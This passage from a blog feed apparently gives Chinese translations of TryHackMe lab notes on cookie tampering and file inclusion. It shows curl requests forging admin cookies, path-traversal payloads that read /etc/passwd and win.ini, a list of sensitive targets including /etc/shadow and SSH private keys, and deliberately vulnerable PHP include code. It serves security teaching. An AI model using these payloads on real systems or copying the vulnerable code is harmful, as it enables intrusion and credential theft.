&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;cookie-篡改&#34;&gt;Cookie 篡改
&lt;/h2&gt;&lt;p&gt;在联机会话期间检查和编辑 Web 服务器设置的 Cookie 可能会产生多种结果，例如未经身份验证的访问、访问其他用户帐户或提升的权限。&lt;/p&gt;
&lt;h3 id=&#34;纯文本&#34;&gt;&lt;strong&gt;纯文本&lt;/strong&gt;
&lt;/h3&gt;&lt;p&gt;某些 cookie 的内容可以是纯文本形式，并且它们的作用很明显。例如，如果这些是成功登录后设置的 Cookie：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Set-Cookie: logged_in=true; Max-Age=3600; Path=/
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Set-Cookie: admin=false; Max-Age=3600; Path=/
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;我们看到一个 Cookie （logged_in），它似乎用于控制用户当前是否登录，以及另一个 （admin），它控制访客是否具有管理员权限。使用这个逻辑，如果我们要更改 cookie 的内容并发出请求，我们将能够更改我们的权限。&lt;/p&gt;
&lt;p&gt;首先，我们先请求目标页面：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;user@tryhackme$ curl http://MACHINE_IP/cookie-test
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;我们可以看到我们返回了一条消息：&lt;strong&gt;Not Logged In&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;现在，我们将发送另一个请求，其中 logged_in Cookie 设置为 true，管理 Cookie 设置为 false：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;user@tryhackme$ curl -H &amp;#34;Cookie: logged_in=true; admin=false&amp;#34; http://MACHINE_IP/cookie-test
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;我们收到消息：&lt;strong&gt;Logged In As A User&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;最后，我们将发送最后一个请求，将 logged_in 和 admin Cookie 都设置为 true：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;user@tryhackme$ curl -H &amp;#34;Cookie: logged_in=true; admin=true&amp;#34; http://MACHINE_IP/cookie-test
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;这将返回结果：&lt;strong&gt;Logged In As An Admin&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;hashing-散列法&#34;&gt;Hashing &lt;strong&gt;散列法&lt;/strong&gt;
&lt;/h3&gt;&lt;p&gt;有时 Cookie 值看起来像一长串随机字符;这些称为哈希，它是原始文本的不可逆表示。以下是您可能会遇到的一些示例：&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;&lt;strong&gt;原始字符串&lt;/strong&gt;&lt;/th&gt;
          &lt;th&gt;** 哈希方法**&lt;/th&gt;
          &lt;th&gt;&lt;strong&gt;输出&lt;/strong&gt;&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;1&lt;/td&gt;
          &lt;td&gt;md5&lt;/td&gt;
          &lt;td&gt;c4ca4238a0b923820dcc509a6f75849b&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;1&lt;/td&gt;
          &lt;td&gt;sha-256&lt;/td&gt;
          &lt;td&gt;6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;1&lt;/td&gt;
          &lt;td&gt;sha-512&lt;/td&gt;
          &lt;td&gt;4dff4ea340f0a823f15d3f4f01ab62eae0e5da579ccb851f8db9dfe84c58b2b37b89903a740e1ee172da793a6e79d560e5f7f9bd058a12a280433ed6fa46510a&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;1&lt;/td&gt;
          &lt;td&gt;sha1&lt;/td&gt;
          &lt;td&gt;356a192b7913b04c54574d18c28d46e6395428ab&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;从上表中可以看出，同一输入字符串的哈希输出可能会因使用的哈希方法而显著不同。即使哈希是不可逆的，但每次都会产生相同的输出，这对我们很有帮助，因为 &lt;a class=&#34;link&#34; href=&#34;https://crackstation.net/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://crackstation.net/&lt;/a&gt; 等服务会保留数十亿个哈希及其原始字符串的数据库。&lt;/p&gt;
&lt;h3 id=&#34;编码&#34;&gt;&lt;strong&gt;编码&lt;/strong&gt;
&lt;/h3&gt;&lt;p&gt;编码类似于哈希，因为它会创建看似随机的文本字符串，但实际上，编码是可逆的。所以这就引出了一个问题，编码的意义何在？编码使我们能够将二进制数据转换为人类可读的文本，这些文本可以通过仅支持纯文本 ASCII 字符的介质轻松安全地传输。&lt;/p&gt;
&lt;p&gt;常见的编码类型包括 base32 和 base64，前者将二进制数据转换为字符 A-Z 和 2-7，后者使用字符 a-z、A-Z、0-9、+ 和 equals 符号进行转换进行填充。&lt;/p&gt;
&lt;p&gt;以以下数据为例，该数据由 Web 服务器在登录时设置：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Set-Cookie: session=eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ==; Max-Age=3600; Path=/
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;这个字符串 base64 解码的值为 &lt;strong&gt;{“id”：1，“admin”： false}&lt;/strong&gt; ，然后我们可以再次将其编码回 base64 编码，但将 admin 值设置为 true，这现在为我们提供了管理员访问权限。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>文件包含基础</title>
        <link>https://Yerucrem.github.io/p/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%9F%BA%E7%A1%80/</link>
        <pubDate>Wed, 19 Mar 2025 00:00:00 +0000</pubDate>
        
        <guid>https://Yerucrem.github.io/p/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%9F%BA%E7%A1%80/</guid>
        <description>&lt;img src="https://Yerucrem.github.io/p/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%9F%BA%E7%A1%80/9e73050aede3552bc3b00fe7cfe1120f427c37f01e08ad760bbdfa9abc939b1c.png" alt="Featured image of post 文件包含基础" /&gt;&lt;h1 id=&#34;文件包含基础&#34;&gt;文件包含基础
&lt;/h1&gt;&lt;h2 id=&#34;介绍&#34;&gt;介绍
&lt;/h2&gt;&lt;p&gt;此房间旨在为您提供利用文件包含漏洞的基本知识，包括本地文件包含 （LFI）、远程文件包含 （RFI） 和目录遍历。此外，我们还将讨论发现这些漏洞的风险以及所需的补救措施。我们提供了每个漏洞的一些实际示例以及实践挑战。&lt;/p&gt;
&lt;p&gt;在某些情况下，编写 Web 应用程序是为了通过参数请求访问给定系统上的文件，包括图像、静态文本等。参数是附加到 URL 的查询参数字符串，可用于检索数据或根据用户输入执行作。 下图分解了 URL 的基本部分。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Yerucrem.github.io/p/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%9F%BA%E7%A1%80/image-20250319135235271.png&#34;
	width=&#34;808&#34;
	height=&#34;383&#34;
	srcset=&#34;https://Yerucrem.github.io/p/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%9F%BA%E7%A1%80/image-20250319135235271_hu_f57287e6d811ed.png 480w, https://Yerucrem.github.io/p/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%9F%BA%E7%A1%80/image-20250319135235271_hu_da64751108a44094.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;210&#34;
		data-flex-basis=&#34;506px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;例如，参数用于 Google 搜索，其中 GET 请求将用户输入传递到搜索引擎中。 &lt;a class=&#34;link&#34; href=&#34;https://www.google.com/search?q=TryHackMe&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.google.com/search?q=TryHackMe&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;让我们讨论一个用户请求从 Web 服务器访问文件的场景。首先，用户向 Web 服务器发送一个 HTTP 请求，其中包含要显示的文件。例如，如果用户想要在 Web 应用程序中访问和显示其 CV，则请求可能如下所示，http://webapp.thm/get.php?file=userCV.pdf，其中 file 是参数，userCV.pdf是要访问的必需文件。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Yerucrem.github.io/p/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%9F%BA%E7%A1%80/image-20250319135313594.png&#34;
	width=&#34;1189&#34;
	height=&#34;552&#34;
	srcset=&#34;https://Yerucrem.github.io/p/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%9F%BA%E7%A1%80/image-20250319135313594_hu_a4068aa13869e613.png 480w, https://Yerucrem.github.io/p/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%9F%BA%E7%A1%80/image-20250319135313594_hu_1ace6a5555f9956f.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;215&#34;
		data-flex-basis=&#34;516px&#34;
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;为什么会出现文件包含漏洞&#34;&gt;为什么会出现文件包含漏洞？
&lt;/h3&gt;&lt;p&gt;文件包含漏洞通常在 Web 应用程序（如 PHP ）的各种编程语言 中发现和利用，这些应用程序编写和实现都很糟糕。这些漏洞的主要问题是输入验证，其中用户输入没有经过清理或验证，由用户控制它们。当输入未经过验证时，用户可以将任何输入传递给函数，从而导致漏洞。&lt;/p&gt;
&lt;h3 id=&#34;文件包含有什么风险&#34;&gt;文件包含有什么风险？
&lt;/h3&gt;&lt;p&gt;默认情况下，攻击者可以利用文件包含漏洞来泄露数据，例如代码、凭据或与 Web 应用程序或作系统相关的其他重要文件。此外，如果攻击者可以通过任何其他方式将文件写入服务器，则文件包含可能会协同使用以获得远程命令执行 （RCE）。&lt;/p&gt;
&lt;h2 id=&#34;路径遍历&#34;&gt;路径遍历
&lt;/h2&gt;&lt;p&gt;也称为目录遍历，允许攻击者读取作系统资源，例如运行应用程序的服务器上的本地文件。攻击者通过纵和滥用 Web 应用程序的 URL 来查找和访问存储在应用程序根目录之外的文件或目录，从而利用此漏洞。&lt;/p&gt;
&lt;p&gt;当用户的输入传递到 PHP 中的 file_get_contents 等函数时，会出现路径遍历漏洞。请务必注意，该函数并不是导致此漏洞的主要因素。通常，糟糕的输入验证或筛选是导致此漏洞的原因。在 PHP 中，您可以使用 file_get_contents 读取文件的内容。&lt;/p&gt;
&lt;p&gt;下图显示了 Web 应用程序如何在 &lt;code&gt;/var/www/app&lt;/code&gt; 中存储文件。满意的路径是用户请求 从定义的路径 &lt;code&gt;/var/www/app/CVs userCV.pdf&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Yerucrem.github.io/p/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%9F%BA%E7%A1%80/image-20250319135502038.png&#34;
	width=&#34;1388&#34;
	height=&#34;594&#34;
	srcset=&#34;https://Yerucrem.github.io/p/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%9F%BA%E7%A1%80/image-20250319135502038_hu_f2670e2d3db27160.png 480w, https://Yerucrem.github.io/p/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%9F%BA%E7%A1%80/image-20250319135502038_hu_89fa0c7b875e8386.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;233&#34;
		data-flex-basis=&#34;560px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;我们 可以通过添加有效负载来测试 URL 参数，以查看 Web 应用程序的行为方式。路径遍历攻击，也称为点-点-斜杠攻击，利用双点将目录上移一步。 如果攻击者找到入口点，在本例中为 get.php?file=，那么攻击者可能会发送如下内容 &lt;a class=&#34;link&#34; href=&#34;http://webapp.thm/get.php?file=../../../../etc/passwd&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://webapp.thm/get.php?file=../../../../etc/passwd&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;假设没有输入验证，而不是访问 PDF 文件位于 /var/www/app/CVs 位置，则 Web 应用程序会从其他 目录，在本例中为 /etc/passwd。每个 &lt;code&gt;..&lt;/code&gt; 条目都会移动一个目录，直到到达根目录 &lt;code&gt;/&lt;/code&gt;。然后，它将目录更改为 /etc，然后从那里读取 passwd 文件。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Yerucrem.github.io/p/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%9F%BA%E7%A1%80/image-20250319135730518.png&#34;
	width=&#34;694&#34;
	height=&#34;593&#34;
	srcset=&#34;https://Yerucrem.github.io/p/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%9F%BA%E7%A1%80/image-20250319135730518_hu_7bcd6ff32f61c9d6.png 480w, https://Yerucrem.github.io/p/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%9F%BA%E7%A1%80/image-20250319135730518_hu_3fb6401bb725182f.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;117&#34;
		data-flex-basis=&#34;280px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;因此，Web 应用程序将文件的内容发送回给用户。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Yerucrem.github.io/p/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%9F%BA%E7%A1%80/image-20250319135753945.png&#34;
	width=&#34;941&#34;
	height=&#34;466&#34;
	srcset=&#34;https://Yerucrem.github.io/p/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%9F%BA%E7%A1%80/image-20250319135753945_hu_5421b849f2521391.png 480w, https://Yerucrem.github.io/p/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%9F%BA%E7%A1%80/image-20250319135753945_hu_3db6ffff0bb1f9e8.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;201&#34;
		data-flex-basis=&#34;484px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;同样，如果 Web 应用程序在 Windows 服务器上运行，攻击者需要提供 Windows 路径。例如，如果攻击者想要读取位于c:\boot.ini 中的 boot.ini 文件，则攻击者可以根据目标尝试以下作 作系统版本：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;http://webapp.thm/get.php?file=../../../../boot.ini 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;或
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;http://webapp.thm/get.php?file=../../../../windows/win.ini
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;与 Linux作系统相同的概念在这里适用，在这种作系统中，我们爬上目录直到它到达根目录，这通常是 .&lt;/p&gt;
&lt;p&gt;有时，开发人员会添加过滤器以限制仅访问某些文件或目录。以下是测试时可以使用的一些常见作系统文件。&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;位置&lt;/th&gt;
          &lt;th&gt;描述&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;/etc/issue&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;包含要在登录提示之前打印的消息或系统标识。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;/etc/profile&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;控制系统范围的默认变量，如导出变量、文件创建掩码 （umask）、终端类型、邮件消息，以指示新邮件何时到达&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;/proc/version&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;指定 Linux 内核的版本&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;etc/passwd&lt;/code&gt; &lt;code&gt;等/passwd&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;具有有权访问系统的所有注册用户&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;/etc/shadow&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;包含有关系统用户密码的信息&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;/root/.bash_history&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;包含 &lt;code&gt;root &lt;/code&gt;用户的 history 命令&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;/var/log/dmessage&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;包含全局系统消息，包括系统启动期间记录的消息&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;`/var/mail/root&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;根&lt;/code&gt;用户的所有电子邮件&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;/root/.ssh/id_rsa&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;服务器上 root 或任何已知有效用户的私有 SSH 密钥&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;/var/log/apache2/access.log&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;Web 服务器的&lt;/code&gt;访问请求&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;C:\boot.ini&lt;/code&gt; &lt;code&gt;C：\boot.ini&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;包含具有 BIOS 固件的计算机的启动选项&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;本地文件包含-lfi&#34;&gt;本地文件包含 LFI
&lt;/h2&gt;&lt;h3 id=&#34;一&#34;&gt;一
&lt;/h3&gt;&lt;p&gt;针对 Web 应用程序的 LFI 攻击通常是由于开发人员缺乏安全意识。使用 PHP 时，使用 include、require、include_once 和 require_once 等功能通常会导致 Web 应用程序易受攻击。在这个房间里，我们将挑选 PHP，但值得注意的是，使用其他语言（如 ASP、JSP）甚至在 Node.js 应用程序中也会出现 LFI 漏洞。LFI 漏洞利用遵循与路径遍历相同的概念。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;PHP&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;k&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;lang&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;上面的 PHP 代码通过 URL 参数 lang 使用 GET 请求来包含页面的文件。可以通过发送以下 HTTP 请求来完成调用，如下所示：http://webapp.thm/index.php?lang=EN.php 加载英文页面或 &lt;a class=&#34;link&#34; href=&#34;http://webapp.thm/index.php?lang=AR.php&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://webapp.thm/index.php?lang=AR.php&lt;/a&gt;加载阿拉伯语页面，其中 EN.php 和 AR.php文件位于同一目录中。&lt;/p&gt;
&lt;p&gt;理论上，如果没有任何输入验证，我们可以从上面的代码中访问和显示服务器上的任何可读文件。假设我们想读取 /etc/passwd 文件，其中包含有关 Linux作系统用户的敏感信息，我们可以尝试以下作：http://webapp.thm/get.php?file=/etc/passwd&lt;/p&gt;
&lt;p&gt;在这种情况下，它之所以有效，是因为 include 函数中没有指定目录，也没有输入验证。&lt;/p&gt;
&lt;h3 id=&#34;二&#34;&gt;二
&lt;/h3&gt;&lt;p&gt;接下来，在下面的代码中，开发人员决定指定函数内部的目录。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;PHP&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;k&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;languages/&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;lang&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;在上面的代码中，开发者决定使用 include 函数，只通过 lang 参数调用 languages 目录下的 PHP 页面。&lt;/p&gt;
&lt;p&gt;如果没有输入验证，攻击者可以通过将 lang 输入替换为其他作系统敏感文件（如 /etc/passwd）来纵 URL。&lt;/p&gt;
